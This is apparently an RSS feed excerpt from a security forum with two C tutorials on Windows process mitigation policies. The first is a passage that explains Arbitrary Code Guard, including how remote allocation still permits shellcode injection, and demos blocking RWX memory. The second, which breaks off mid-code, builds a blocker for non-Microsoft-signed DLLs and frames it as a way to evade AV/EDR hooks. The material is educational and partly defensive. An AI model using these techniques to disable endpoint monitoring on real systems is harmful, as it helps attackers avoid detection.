<pre><code class="lang-c">VirtualProtectEx(hProcess, lpAddress, dwSize, flNewProtect, &amp;lpflOldProtect);
</code></pre>
<ul>
<li>NtProtectVirtualMemory</li>
</ul>
<p>Lower level API to modify protections on a memory region:</p>
<pre><code class="lang-c">HANDLE hProcess;
void* baseAddress;

NtProtectVirtualMemory(hProcess, &amp;baseAddress, &amp;size, 
  newProtection, &amp;oldProtection);
</code></pre>
<ul>
<li>ZwProtectVirtualMemory</li>
</ul>
<p>Kernel-mode version of NtProtectVirtualMemory:</p>
<pre><code class="lang-c">ZwProtectVirtualMemory(hProcess, &amp;baseAddress, &amp;size,
  newProtection, &amp;oldProtection);
</code></pre>
<p>So in summary, the key Windows API options for modifying page protections are VirtualProtect, VirtualAllocEx, and the Nt/Zw variants.</p>
<blockquote>
<p>Note: these are just a few of the possible RWX operations that can be used to modify memory protections. There are many more that can be used to accomplish the same task all the way from the high level Windows API, as well as, the lower level Nt/Zw API and its abstractions.</p>
</blockquote>
<h2><a name="downsides-of-acg-5" class="anchor" href="https://0x00sec.org#downsides-of-acg-5"></a>Downsides of ACG</h2>
<p>While Arbitrary Code Guard (ACG) provides strong mitigation against exploits, some may assume it completely prevents injecting arbitrary code into a protected process. This is a common misconception. Now you may be asking yourself, how can this be? How can we still inject arbitrary code into a protected process if ACG prevents making memory executable? Well smart reader, you raise a good point - if ACG prevents making memory executable, how can we still inject arbitrary code into a protected process?</p>
<p>The key is that ACG only prevents a process from making its own memory executable. It does not restrict a remote process from allocating executable memory in the target process.</p>
<p>Specifically, ACG allows calls like <code>VirtualAllocEx()</code> from remote processes to allocate memory with executable permissions in the target process. This allows injecting shellcode into the allocated memory region.</p>
<p>Once allocated, the target process can execute this shellcode, even though ACG prevents it from marking its own memory executable.</p>
<p>So in summary:</p>
<ul>
<li>
<p>ACG prevents a process from making its own memory executable after-the-fact. Calls like VirtualProtect() will fail.</p>
</li>
<li>
<p>But ACG does not restrict other processes from allocating executable memory in the target process.</p>
</li>
<li>
<p>This allows injecting arbitrary shellcode into the freshly allocated RWX memory.</p>
</li>
<li>
<p>The target process can then execute the injected shellcode, bypassing ACG’s protections on its own memory.</p>
</li>
</ul>
<p>So ACG makes exploitation harder by preventing common techniques like marking stack/heap memory as executable. But it does not prevent the initial allocation of executable memory for shellcode injection.</p>
<p>The tradeoff is allowing processes to allocate executable memory is required for legitimate functionality like just-in-time (JIT) compilers to work. ACG tries to strike a balance in increasing exploit difficulty while permitting necessary executable allocations.</p>
<h2><a name="but-what-about-jit-compiled-code-6" class="anchor" href="https://0x00sec.org#but-what-about-jit-compiled-code-6"></a>But what about JIT compiled code?</h2>
<p>JIT engines need to generate executable code at runtime, which seems incompatible with ACG. Microsoft Edge handles this cleverly with a separate JIT process. The browser content runs in a protected process with ACG enabled. The JIT engine runs in a separate unprotected process called <code>MicrosoftEdgeCP.exe</code>. The JIT process allocates memory pages as read-write to allow generating code. These pages are mapped into the content process as read-execute, allowing the content process to run the JIT code while staying protected by ACG. So in summary, ACG forces attackers to rely on complex ROP techniques for their full shellcode. The separate JIT process pattern allows JIT compiled code while keeping ACG protection intact. These measures significantly raise the bar for exploit reliability and complexity.</p>
<h2><a name="mitigating-these-downsides-7" class="anchor" href="https://0x00sec.org#mitigating-these-downsides-7"></a>Mitigating these downsides</h2>
<p>Exploit mitigation techniques like ACG aim to prevent attackers from easily executing arbitrary code during an exploitation attempt.</p>
<p>A common exploit technique is to inject malicious shellcode into the target process’s memory space. The attacker needs this memory to be writable so they can inject the code. However, they also need it to be executable to actually run the shellcode.</p>
<p>This is where DEP (Data Execution Prevention) comes in - it prevents code execution from memory regions marked as only writable. So attackers got around this using return-oriented programming (ROP) - chaining together snippets of existing executable code to build their payload. ROP is complex and tedious though.</p>
<p>An easier method is to change the permissions on the shellcode’s memory page to make it executable after injecting it. The attacker can use API functions like <code>VirtualProtect()</code> to mark the page as executable. ACG blocks these attempts to change permissions. Any call to <code>VirtualProtect()</code> or similar to mark pages as executable will fail. Now the attacker has no choice but to fully ROP their exploit payload.</p>
<h2><a name="implementation-8" class="anchor" href="https://0x00sec.org#implementation-8"></a>Implementation</h2>
<p>Ok, so now that we have some background information about how and what RWX is, as well as, a general understanding of ACG, lets get started with our RWX blocker program. We will start off by opening up Visual Studio and creating a new blank template project. I decided to name mine <strong>ACG Program</strong> but you can really put just about anything your heart desires. For this example I decided to use <strong>C</strong> programming language as I am fairly well versed and familiar with it but you can use any programming language you want as long as there is some sort of implementation that allows you to utilize the Windows API.</p>
<p>Alright, now that we have a blank project open, lets get started with the code.</p>
<blockquote>
<p>For the sake of simplicity I will only be importing the windows.h header file and stdio.h for some basic information logging and error printouts. However, if you are planning on using this code in a larger project or in conjuction with other code or evasion techniques I will be covering later on, you may need to import other header files as well.</p>
</blockquote>
<h3><a name="h-1-laying-out-the-groundwork-9" class="anchor" href="https://0x00sec.org#h-1-laying-out-the-groundwork-9"></a>1. Laying out the groundwork:</h3>
<p>In this initial step, we declare a pointer to a function and initialize it with the memory address returned by the <code>malloc()</code> function. This is just a dummy function that will be used later to demonstrate the <code>VirtualProtect()</code> function.</p>
<pre><code class="lang-c">// Dummy function pointer to use for VirtualProtect demo
void* dummyFunction = (void*)malloc;
</code></pre>
<p>This next function tries to allocate some RWX memory using the <code>VirtualAlloc()</code> function with the <code>MEM_RESERVE | MEM_COMMIT</code> flags set, which reserve and commit the specified memory region. The <code>PAGE_EXECUTE_READWRITE</code> flag is also set to allow the memory to be both readable and writable as well as executable.</p>
<p>If the allocation is successful, the memory address is printed to the console. The function then tries to update an existing memory page with RWX protection using the <code>VirtualProtect()</code> function. The <code>dummyFunction</code> pointer is used as the memory address to update, and the <code>4096</code> parameter specifies the size of the memory page being updated. If the protection update is successful, the memory address of the function is printed to the console.</p>
<pre><code class="lang-c">void rwxOperations() {
    DWORD oldProtection;

    // Let's try to allocate some RWX memory
    void* mem = VirtualAlloc(0, 1024, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (mem == NULL) {
        printf(" |--- [-] Error allocating RWX memory\n");
    }
    else {
        printf(" |--- [+] RWX memory allocated: %p\n", mem);
    }

    // Let's also try a VirtualProtect to see if we can update an existing page to RWX
    if (!VirtualProtect(dummyFunction, 4096, PAGE_EXECUTE_READWRITE, &amp;oldProtection)) {
        printf(" |--- [-] Error updating dummyFunction [%p] memory to RWX\n\n", dummyFunction);
    }
    else {
        printf(" |--- [+] dummyFunction [%p] memory updated to RWX\n\n", dummyFunction);
    }
}
</code></pre>
<h3><a name="h-2-program-entry-point-10" class="anchor" href="https://0x00sec.org#h-2-program-entry-point-10"></a>2. Program entry point:</h3>
<p>We start off the entry point of the program by specifying;</p>
<pre><code class="lang-c">int main(void) {
    // ...
}   
</code></pre>
<p>This step defines the <code>main()</code> function the void keyword in the parentheses indicates that the function takes no arguments.</p>
<blockquote>
<p>It is important to note that specifying void inside of the main paranthese is a debate that has been going on for a while now and is not required depending on your compiler or C version. However, it is still a good practice to include it as it makes the code more readable and easier to understand. You can read more about this in <a href="https://stackoverflow.com/questions/3156423/why-dont-we-use-void-in-main" rel="noopener nofollow ugc">this</a> StackOverflow post.</p>
</blockquote>
<p>We also go ahead and declare a variable <code>c</code> to hold the value returned by the <code>getchar()</code> function. This is used to pause the program execution and wait for the user to make an input on their keyboard before continuing in order to help us demonstrate the process using process hacker.</p>
<pre><code class="lang-c">int c;
</code></pre>
<h3><a name="h-3-configuring-process-mitigation-policy-11" class="anchor" href="https://0x00sec.org#h-3-configuring-process-mitigation-policy-11"></a>3. Configuring Process Mitigation Policy:</h3>
<p>First off we declare a <code>PROCESS_MITIGATION_DYNAMIC_CODE_POLICY</code> structure named <code>policy</code>.</p>
<p>Here is what the structure internals look like in the Windows API:</p>
<pre><code class="lang-c">typedef struct _PROCESS_MITIGATION_DYNAMIC_CODE_POLICY {
  union {
    DWORD Flags;
    struct {
      DWORD ProhibitDynamicCode : 1;
      DWORD AllowThreadOptOut : 1;
      DWORD AllowRemoteDowngrade : 1;
      DWORD AuditProhibitDynamicCode : 1;
      DWORD ReservedFlags : 28;
    } DUMMYSTRUCTNAME;
  } DUMMYUNIONNAME;
} PROCESS_MITIGATION_DYNAMIC_CODE_POLICY, *PPROCESS_MITIGATION_DYNAMIC_CODE_POLICY;
</code></pre>
<p>And here is what it looks like when we define the policy variable in our program:</p>
<pre><code class="lang-c">PROCESS_MITIGATION_DYNAMIC_CODE_POLICY policy;
</code></pre>
<p>We then use the <code>ZeroMemory()</code> function to zero out the memory allocated for the <code>policy</code> structure. This is necessary because the <code>SetProcessMitigationPolicy()</code> function requires the structure to be initialized to 0.</p>
<pre><code class="lang-c">ZeroMemory(&amp;policy, sizeof(policy));
</code></pre>
<p>After this we set the <code>policy.ProhibitDynamicCode</code> field to 1 to indicate that dynamic code creation should be prohibited and print out a message to the console indicating that the program has started.</p>
<pre><code class="lang-c">policy.ProhibitDynamicCode = 1;

printf("Program started\n---------------\n");
</code></pre>
<h3><a name="h-4-running-the-first-rwx-test-pre-mitigation-policy-12" class="anchor" href="https://0x00sec.org#h-4-running-the-first-rwx-test-pre-mitigation-policy-12"></a>4. Running the first RWX test (pre-mitigation policy):</h3>
<p>At this point in the program we now want to test out those two RWX functions we were talking about before. We start off by printing a message to the console and wait for the user to press a key before calling the <code>rwxOperations()</code> function to allocate and set RWX memory.</p>
<pre><code class="lang-c">printf("[*] Press a key to allocate and set RWX memory...\n");
c = getchar();
rwxOperations();
</code></pre>
<p>The output we get should look something like this:</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/5/c/5c08583e13409a6935f3ce33d0996059d0a8fb6c.png" data-download-href="/uploads/short-url/d89NX9RZPDBlbOIZIjTY7ZMOtuA.png?dl=1" title="" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/5/c/5c08583e13409a6935f3ce33d0996059d0a8fb6c_2_690x129.png" alt="" data-base62-sha1="d89NX9RZPDBlbOIZIjTY7ZMOtuA" role="presentation" width="690" height="129" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/5/c/5c08583e13409a6935f3ce33d0996059d0a8fb6c_2_690x129.png, https://0x00sec.s3.amazonaws.com/original/3X/5/c/5c08583e13409a6935f3ce33d0996059d0a8fb6c.png 1.5x, https://0x00sec.s3.amazonaws.com/original/3X/5/c/5c08583e13409a6935f3ce33d0996059d0a8fb6c.png 2x" data-dominant-color="373C43"></a></div><br>
<em>Terminal Output of the <strong>first</strong> RWX Test</em><p></p>
<h3><a name="h-5-applying-the-mitigation-policy-13" class="anchor" href="https://0x00sec.org#h-5-applying-the-mitigation-policy-13"></a>5. Applying the mitigation policy:</h3>
<p>Ok so now we have made it to the part in the article where the actual magic happens, first off, we print a message to the console and wait for the user to make an input with their keyboard before calling the <code>SetProcessMitigationPolicy()</code> function to apply the <code>PROCESS_MITIGATION_DYNAMIC_CODE_POLICY</code> mitigation policy.</p>
<p>Before we do this however, there is a very easy way to actually check if our policy is applied via an external process managing program called process hacker. Using process hacker. In this image below we can see that the <code>acg_program.exe</code> process has the “DEP” and “ASLR” policies applied that we touched on briefly <a href="https://0x00sec.org#mitigating-these-downsides">here</a> but does <strong>not</strong> have any mitigation policies against dynamic code execution.</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/a/2/a25cb36b47d2f92cb5263e158085574a0086ff4e.png" data-download-href="/uploads/short-url/najXzCDUwMfpI267mRWRPJaYl2u.png?dl=1" title="" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/original/3X/a/2/a25cb36b47d2f92cb5263e158085574a0086ff4e.png" alt="" data-base62-sha1="najXzCDUwMfpI267mRWRPJaYl2u" role="presentation" width="690" height="461" data-dominant-color="E9EDE8"></a></div><br>
<em>ACG Program running with <strong>no</strong> dynamic code prohibited policy</em><p></p>
<p>Now back to the code:</p>
<pre><code class="lang-c">printf("[*] Press a key to run SetProcessMitigationPolicy to apply PROCESS_MITIGATION_DYNAMIC_CODE_POLICY...\n");
c = getchar();
</code></pre>
<p>Once the user has made an input we can use the <code>SetProcessMitigationPolicy()</code> function to apply the <code>PROCESS_MITIGATION_DYNAMIC_CODE_POLICY</code> mitigation policy. If the function call fails, an error message is printed to the console and the program returns 1 to indicate failure. If the function call is successful, a message is printed to the console indicating that the policy has been set.</p>
<pre><code class="lang-c">if (SetProcessMitigationPolicy(ProcessDynamicCodePolicy, &amp;policy, sizeof(policy)) == false) {
    printf(" |--- [-] SetProcessMitigationPolicy failed\n");
    return 1; // Return 1 on failure
}
else {
    printf(" |--- [+] Process mitigation policy set\n\n");
}
</code></pre>
<p>The terminal output should look something like this now:</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/5/c/5c08583e13409a6935f3ce33d0996059d0a8fb6c.png" data-download-href="/uploads/short-url/d89NX9RZPDBlbOIZIjTY7ZMOtuA.png?dl=1" title="" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/5/c/5c08583e13409a6935f3ce33d0996059d0a8fb6c_2_690x129.png" alt="" data-base62-sha1="d89NX9RZPDBlbOIZIjTY7ZMOtuA" role="presentation" width="690" height="129" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/5/c/5c08583e13409a6935f3ce33d0996059d0a8fb6c_2_690x129.png, https://0x00sec.s3.amazonaws.com/original/3X/5/c/5c08583e13409a6935f3ce33d0996059d0a8fb6c.png 1.5x, https://0x00sec.s3.amazonaws.com/original/3X/5/c/5c08583e13409a6935f3ce33d0996059d0a8fb6c.png 2x" data-dominant-color="373C43"></a></div><br>
<em>Terminal Output Once we Attempt to Apply the Policy</em><p></p>
<p>Now if we go back to process hacker and refresh the process list we can see that the <code>acg_program.exe</code> process still has the same “DEP” and “ASLR” policies applied, however, it now also has the <code>PROCESS_MITIGATION_DYNAMIC_CODE_POLICY</code> mitigation policy applied to it.</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/9/3/93e034b669df8fce47cc42b3458300eb2bd4704a.png" data-download-href="/uploads/short-url/l6axV36nzlK86NTYnqhL4Mf2yqm.png?dl=1" title="" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/original/3X/9/3/93e034b669df8fce47cc42b3458300eb2bd4704a.png" alt="" data-base62-sha1="l6axV36nzlK86NTYnqhL4Mf2yqm" role="presentation" width="690" height="473" data-dominant-color="EAF0F0"></a></div><br>
<em>ACG Program running <strong>with</strong> dynamic code prohibited policy</em><p></p>
<h3><a name="h-6-running-the-second-rwx-test-post-mitigation-policy-14" class="anchor" href="https://0x00sec.org#h-6-running-the-second-rwx-test-post-mitigation-policy-14"></a>6. Running the second RWX test (post-mitigation policy):</h3>
<p>Now that the policy has been set can print a message to the console and wait for the user to press a key before calling the <code>rwxOperations()</code> function again to try and allocate and set RWX memory again. However, this time the operation should fail due to the dynamic code policy being in effect.</p>
<pre><code class="lang-c">printf("[*] Press a key to allocate and set RWX memory again (should fail due to the dynamic code policy)...\n");
c = getchar();

// Allocate and set RWX memory again (should fail due to the dynamic code policy)
rwxOperations();
</code></pre>
<p>The output that we should be getting now should look something like this:</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/4/b/4bc271fb227f2208085f3726a3ba2433c45c1438.png" data-download-href="/uploads/short-url/aOcpfBuTIUsfbr4WFjpiMBV2Jni.png?dl=1" title="" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/4/b/4bc271fb227f2208085f3726a3ba2433c45c1438_2_690x220.png" alt="" data-base62-sha1="aOcpfBuTIUsfbr4WFjpiMBV2Jni" role="presentation" width="690" height="220" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/4/b/4bc271fb227f2208085f3726a3ba2433c45c1438_2_690x220.png, https://0x00sec.s3.amazonaws.com/original/3X/4/b/4bc271fb227f2208085f3726a3ba2433c45c1438.png 1.5x, https://0x00sec.s3.amazonaws.com/original/3X/4/b/4bc271fb227f2208085f3726a3ba2433c45c1438.png 2x" data-dominant-color="353841"></a></div><br>
<em>Terminal Output of the <strong>Second</strong> RWX Test</em><p></p>
<h3><a name="h-7-finishing-the-program-and-final-thoughts-15" class="anchor" href="https://0x00sec.org#h-7-finishing-the-program-and-final-thoughts-15"></a>7. Finishing the program and final thoughts:</h3>
<p>Finally, we can return 0 to indicate success and gracefully exit the program.</p>
<pre><code class="lang-c">return 0; // Return 0 on success
</code></pre>
<p>Now that we have finished our program, lets compile it and see what happens when we try to run it.</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/3X/9/d/9dd8ab634154474c71452cb18f7950ad6f42a571.gif" alt="" data-base62-sha1="mwnaR2finco3h4mcsRSmt35Fi5b" role="presentation" width="690" height="356" class="animated"><br>
<em>Recording of Full Program Usage</em></p>
<h2><a name="conclusion-16" class="anchor" href="https://0x00sec.org#conclusion-16"></a>Conclusion:</h2>
<p>In this article, we built a program that demonstrates how to allocate and set RWX memory in Windows using the <code>VirtualAlloc()</code> function and how to apply the <code>PROCESS_MITIGATION_DYNAMIC_CODE_POLICY</code> mitigation policy to prohibit the creation of dynamic code. The <code>dummyFunction</code> pointer and the <code>VirtualProtect()</code> function are used to demonstrate updating the protection of an existing memory page to RWX.<br>
We learnt about what exactly ACG really is, how it works, its downfalls, and how we can use it to our advantage to protect our programs from malicious threat actors.<br>
This example program demonstrates just <em>one</em> possible way to help improve your projects evasion level in a secure enviroment and how to implement process creation mitigation policies. However we also discoverd that we can effectively protect a program from more threat actors by conjoining multiple of these policies together.<br>
As I mentioned multiple times before this is only the beginning. In my next project I will be exploring a more <em>advanced</em> technique known as DLL patching and how we can also use this technique to bypass AV/EDR hooks and evade detection in a much <em>quieter</em> and <em>effective</em> way. I hope you enjoyed this article and I will see you in the next one!<br>
(This article is copied down from my website which has much better formatting and layout that you can find <a href="https://44.is-a.dev/posts/Blocking-Operations-On-Executable-Memory-Pages/" rel="noopener nofollow ugc">here</a>)</p>
            <p><small>3 posts - 2 participants</small></p>
            <p><a href="https://0x00sec.org/t/mitigating-program-tampering-and-bypassing-av-edr-through-blocking-operations-on-executable-memory-pages/36113">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/mitigating-program-tampering-and-bypassing-av-edr-through-blocking-operations-on-executable-memory-pages/36113</link>
          <pubDate>Tue, 25 Jul 2023 02:23:52 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-36113</guid>
          <source url="https://0x00sec.org/t/mitigating-program-tampering-and-bypassing-av-edr-through-blocking-operations-on-executable-memory-pages/36113.rss">Mitigating Program Tampering and Bypassing AV/EDR Through Blocking Operations on Executable Memory Pages</source>
        </item>
        <item>
          <title>Building a basic DLL blocker</title>
          <dc:creator><![CDATA[9xN]]></dc:creator>
          <category>Malware</category>
          <description><![CDATA[
            <p>This article will serve as an entry point into a multi-part evasion technique series to bypass antivirus (AV) and endpoint detection and response (EDR) systems. This method can also help protect legitimate processes againt several different malware injection strategies used by modern day state of the art malicious software.<br>
(This article is copied down from my website which has much better formatting and layout that you can find <a href="https://44.is-a.dev/posts/Building-A-DLL-Blocker/" rel="noopener nofollow ugc">here</a>)</p>
<h2><a name="introduction-1" class="anchor" href="https://0x00sec.org#introduction-1"></a>Introduction</h2>
<p>Many antivirus (AV) and endpoint detection and response (EDR) solutions heavily rely on user-mode API hooking to detect malicious behavior in real-time. By injecting a dynamic-link library (DLL) into user processes, these products can monitor and identify suspicious activities during runtime.</p>
<p><a href="https://mermaid.live/edit#pako:eNpVkEFPwzAMhf9K5NMmNnHvASmiMJCyMXViF8zBajJasTpTmgihbf8dp5ug5OT4fX558RFqbx0UsNv7r7qhEJWpkPX2oawmCHp7KwWykjMxlLhuXK88qz4Kmg5ThCnyunpZVHr5hrAO_iNQh_D-2318XmkzkvgGuTRmQIx-Xd0_ZVCATbZUY4f86pBEzed3Jxk6qavpRfsbz8B_7XoZC0MSmEHnQketlU8fM4sQG9c5hEJKS-ETAfksHKXoN99cQxFDcjNIB0vRlS3lgFDsaN9L19k2-rC8bHFY5vkHIqxqqQ" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/original/3X/d/5/d5e628da68627315547585f4352171812dbcadc7.png" alt="" data-base62-sha1="uweOA4R1wGQfQBXCNUpIwA71gvt" role="presentation" width="461" height="153"></a></p>
<p>In this article, we will explore the technique of blocking these hooking processes outright to bypass AVs/EDRs (also can be used to block malware from hooking onto, and hiding itself inside of legitimate programs as well). For our demonstration we will use a simulated AV/EDR DLL that will print out a simple “hello world” message on the <code>DLL_PROCESS_ATTACH</code> event, implemented in a DLL called <strong>AV/EDR Simulated DLL</strong> created using Visual Studio. We will simulate AV/EDR hooking by injecting this DLL, using a DLL injector called <strong>DLL Injector</strong>, into an example program called <strong>dummy_program.exe</strong>. Without further adieux lets get started!</p>
<blockquote>
<p>You do not have to know or understand how to create a DLL or DLL Injector to follow along with this article or how the <code>DLL_PROCESS_ATTACH</code> event works. However, if you are interested in learning more about these topics, I recommend checking out the following articles: (im still working on them lol)</p>
</blockquote>
<blockquote>
<p>All of the source code for this article, including the mock DLL, injector, and dummy program are available on <a href="https://github.com/9xN/Blocking-DLLs" rel="noopener nofollow ugc">GitHub</a></p>
</blockquote>
<h2><a name="overview-2" class="anchor" href="https://0x00sec.org#overview-2"></a>Overview</h2>
<p>Our DLL Blocker program will outright <em>prevent</em> the loading of non-Microsoft signed DLLs into a target process. By leveraging the Windows API, a little bit of C knowledge, and process creation mitigation policies, we can fortify our system against <em>most</em> DLL injection occuring in a target process.</p>
<p><a href="https://mermaid.live/edit#pako:eNpVUMtuwjAQ_BVrT0EFQa85VHKbviRDUVDpge3BJA6JSGzk2CoV8O9dJwjontae2ZnRHCAzuYIYitr8ZKW0jokUNV8-J2mEwJdjWlAzmkhIr7NStcxo1jqi-t0AYYB6nn68pny6Qphbs7GyQX2HOhGCPdYm27KilhvU0WR_P7kOnX5fTl_eZ1zc3AdI8M_Z01sgELAIfuwiH31VrmTBYR0ceq0QsgvORqP9kcAjO8v32FWQCA__sfPjFugywRAaZRtZ5dTRIXARXKkahRDTmku7RUB9Ip70zix-dQaxs14Nwe9y6VRSyRAZ4kLWLf2qvHLGTvvSu-5Pf2MUeIo" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/original/3X/2/2/22015e4b04d2a2239d3b691c49c8c0e2c2f8fb0b.png" alt="" data-base62-sha1="4QPagH5VL0TVroy8H6lpdABvUiT" role="presentation" width="531" height="172"></a></p>
<h2><a name="understanding-api-hooking-and-dll-injection-3" class="anchor" href="https://0x00sec.org#understanding-api-hooking-and-dll-injection-3"></a>Understanding API Hooking and DLL Injection</h2>
<blockquote>
<p>I will be providing a much more in-depth guide and information regarding process injection in its entirety in <a href="https://44.is-a.dev/categories/malware/process-injection/" rel="noopener nofollow ugc">this</a> section in my site.</p>
</blockquote>
<p>User-mode API hooking involves injecting a DLL into targeted processes to intercept and monitor system calls and events. This technique allows AV/EDR solutions to intercept and analyze the behavior of running processes. By examining the DLLs loaded into processes, we can gain insights into the hooking mechanism employed by AV/EDR solutions. To illustrate this, we will utilize Sysinternals’ Process Explorer, a powerful tool for inspecting running processes and their associated DLLs. The expected output of this tool is that we should be able to see our <strong>AV/EDR Simulated DLL</strong> loaded into the <strong>dummy_program.exe</strong> process. This DLL is responsible for simulated hooking functionality.</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/b/e/be65bcb829464cfb169befa536b5df83d45573f0.png" data-download-href="/uploads/short-url/rakGNvB6vTxO3Q7MGZai0AfXqJa.png?dl=1" title="" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/b/e/be65bcb829464cfb169befa536b5df83d45573f0_2_690x83.png" alt="" data-base62-sha1="rakGNvB6vTxO3Q7MGZai0AfXqJa" role="presentation" width="690" height="83" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/b/e/be65bcb829464cfb169befa536b5df83d45573f0_2_690x83.png, https://0x00sec.s3.amazonaws.com/original/3X/b/e/be65bcb829464cfb169befa536b5df83d45573f0.png 1.5x, https://0x00sec.s3.amazonaws.com/original/3X/b/e/be65bcb829464cfb169befa536b5df83d45573f0.png 2x" data-dominant-color="3C3F47"></a></div><br>
<em>Injector program injecting external DLL into <strong>dummy_program.exe</strong></em><p></p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/f/d/fd9637247525732f83431fc6a8aca9bc1f6be711.png" data-download-href="/uploads/short-url/AbkDn4mGOFxAzx0BGmmJNR1teDv.png?dl=1" title="" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/f/d/fd9637247525732f83431fc6a8aca9bc1f6be711_2_690x64.png" alt="" data-base62-sha1="AbkDn4mGOFxAzx0BGmmJNR1teDv" role="presentation" width="690" height="64" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/f/d/fd9637247525732f83431fc6a8aca9bc1f6be711_2_690x64.png, https://0x00sec.s3.amazonaws.com/original/3X/f/d/fd9637247525732f83431fc6a8aca9bc1f6be711.png 1.5x, https://0x00sec.s3.amazonaws.com/original/3X/f/d/fd9637247525732f83431fc6a8aca9bc1f6be711.png 2x" data-dominant-color="585A65"></a></div><br>
<em><strong>dummy_program.exe</strong> That has been comprimised/hooked by <strong>AV/EDR Simulated DLL</strong></em><p></p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/6/3/6325843ca84d7994db1b8aa112156b02eeecf0bd.png" data-download-href="/uploads/short-url/e95Ecv3agYqSsjTl7wXOBqEG0TX.png?dl=1" title="" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/original/3X/6/3/6325843ca84d7994db1b8aa112156b02eeecf0bd.png" alt="" data-base62-sha1="e95Ecv3agYqSsjTl7wXOBqEG0TX" role="presentation" width="690" height="233" data-dominant-color="343844"></a></div><br>
<em>Process explorer showing loaded DLL inside <strong>dummy_program.exe</strong></em><p></p>
<h2><a name="implementation-4" class="anchor" href="https://0x00sec.org#implementation-4"></a>Implementation</h2>
<p>Ok, so now that we have some background information about how AV/EDR hooking works, lets get started with our DLL Blocker program. We will start off by opening up Visual Studio and creating a new blank template project. I decided to name mine <strong>DLL Blocker</strong> but you can really put just about anything your heart desires. For this example I decided to use <strong>C</strong> programming language as I am fairly well versed and familiar with it but you can use any programming language you want as long as there is some sort of implementation that allows you to utilize the Windows API.<br>
Alright, now that we have a blank project open, lets get started with the code.</p>
<blockquote>
<p>For the sake of simplicity I will only be importing the windows.h header file and stdio.h for some basic information logging and error printouts. However, if you are planning on using this code in a larger project or in conjuction with other code or evasion techniques I will be covering later on, you may need to import other header files as well.</p>
</blockquote>
<h3><a name="h-1-handling-command-line-arguments-5" class="anchor" href="https://0x00sec.org#h-1-handling-command-line-arguments-5"></a>1. Handling Command Line Arguments:</h3>
<p>In this initial step, we handle the command line arguments passed to the program. The command line argument we require is the path of the target program we want to protect. If no argument is provided, we display the correct usage of the program and then exit with a returned error code of 1.</p>
<pre><code class="lang-c">if (argc &lt; 2)
{
    printf("Usage: %s &lt;target_program_path&gt;\n", argv[0]);
    return 1;
}
</code></pre>
<h3><a name="h-2-converting-the-target-program-path-6" class="anchor" href="https://0x00sec.org#h-2-converting-the-target-program-path-6"></a>2. Converting the Target Program Path:</h3>
<p>Since the Windows API functions that we will use require wide-character strings, we need to convert the narrow-character string representing the target program path to a wide-character string. This conversion ensures compatibility with the Windows API functions.</p>
<pre><code class="lang-c">const char* targetPath = argv[1];

// Convert the target program path to a wide-character string
int wideCharLen = MultiByteToWideChar(CP_UTF8, 0, targetPath, -1, NULL, 0);
wchar_t* wideCharBuffer = new wchar_t[wideCharLen];
MultiByteToWideChar(CP_UTF8, 0, targetPath, -1, wideCharBuffer, wideCharLen);
</code></pre>
<h3><a name="h-3-initializing-process-creation-attributes-7" class="anchor" href="https://0x00sec.org#h-3-initializing-process-creation-attributes-7"></a>3. Initializing Process Creation Attributes:</h3>
<p>To provide extended information during process creation, we initialize the <code>STARTUPINFOEXA</code> structure. This structure allows us to specify additional attributes for the new process, such as process mitigation policies (hint hint).</p>
<pre><code class="lang-c">STARTUPINFOEXA si = {};
PROCESS_INFORMATION pi = {};

// Initialize the STARTUPINFOEXA structure
si.StartupInfo.cb = sizeof(STARTUPINFOEXA);
si.StartupInfo.dwFlags = EXTENDED_STARTUPINFO_PRESENT;

SIZE_T size = 0;
</code></pre>
<h3><a name="h-4-configuring-process-mitigation-policy-8" class="anchor" href="https://0x00sec.org#h-4-configuring-process-mitigation-policy-8"></a>4. Configuring Process Mitigation Policy:</h3>
<p>Now here is where the magic happens.<br>
We enable the blocking of <em>non-Microsoft signed DLLs</em> by setting the <code>PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON</code> policy (resolves to a value of 0x100000000000). This step ensures that only trusted DLLs are allowed to be loaded into the target process.</p>
<pre><code class="lang-c">// Enable blocking of non-Microsoft signed DLLs
DWORD64 policy = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON;

// Assign the mitigation policy attribute
